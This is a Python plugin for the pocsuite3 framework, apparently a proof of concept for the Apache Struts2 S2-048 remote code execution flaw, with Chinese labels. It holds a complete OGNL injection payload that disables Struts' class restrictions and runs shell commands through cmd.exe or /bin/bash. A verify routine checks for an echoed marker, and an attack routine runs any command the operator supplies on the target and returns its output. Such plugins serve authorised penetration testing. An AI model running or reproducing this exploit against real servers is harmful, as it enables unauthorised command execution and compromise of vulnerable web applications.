from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.0.0 - 2.3.32'
    name = 'Struts2-048远程代码执行'
    desc = '''Struts2-048远程代码执行'''
    pocDesc = '''Struts2-048远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-048/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):

        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                  'image/gif,'
                  'image/x-xbitmap,'
                  'image/jpeg,'
                  'image/pjpeg,'
                  'application/vnd.ms-excel,'
                  'application/vnd.ms-powerpoint,'
                  'application/msword,'
                  '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = r"%{(#szgx='multipart/form-data').(#dm=@ognl.Ogn" \
            r"lContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAcces" \
            r"s=#dm):((#container=#context['com.opensymphony.xwork2.ActionCo" \
            r"ntext.container']).(#ognlUtil=#container.getInstance(@com.open" \
            r"symphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPa" \
            r"ckageNames().clear()).(#ognlUtil.getExcludedClasses().clear())" \
            r".(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=" \
            r"(@java.lang.System@getProperty('os.name').toLowerCase().contai" \
            r"ns('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash'," \
            r"'-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redi" \
            r"rectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apach" \
            r"e.struts2.ServletActionContext@getResponse().getOutputStream()" \
            r")).(@org.apache.commons.io.IOUtils@copy(#process.getInputStrea" \
            r"m(),#ros)).(#ros.close())}"
        url = self.url
        if r"saveGangster.action" not in self.url:
            url = self.url + "/integration/saveGangster.action"
        data = {
            'name': payload.replace("RECOMMAND", cmd),
            'age': '233',
            '__checkbox_bustedBefore': 'true',
            'description': '233'
        }
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.post(url, data=data, headers=HEADERS)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['PostData'] = payload
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        payload = r"%{(#szgx='multipart/form-data').(#dm=@ognl.Ogn" \
                  r"lContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAcces" \
                  r"s=#dm):((#container=#context['com.opensymphony.xwork2.ActionCo" \
                  r"ntext.container']).(#ognlUtil=#container.getInstance(@com.open" \
                  r"symphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPa" \
                  r"ckageNames().clear()).(#ognlUtil.getExcludedClasses().clear())" \
                  r".(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=" \
                  r"(@java.lang.System@getProperty('os.name').toLowerCase().contai" \
                  r"ns('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash'," \
                  r"'-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redi" \
                  r"rectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apach" \
                  r"e.struts2.ServletActionContext@getResponse().getOutputStream()" \
                  r")).(@org.apache.commons.io.IOUtils@copy(#process.getInputStrea" \
                  r"m(),#ros)).(#ros.close())}"
        url = self.url
        if r"saveGangster.action" not in self.url:
            url = self.url + "/integration/saveGangster.action"
        data = {
            'name': payload.replace("RECOMMAND", cmd),
            'age': '233',
            '__checkbox_bustedBefore': 'true',
            'description': '233'
        }

        try:
            response = requests.post(url, data=data, headers=HEADERS)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)



register_poc(DemoPOC)
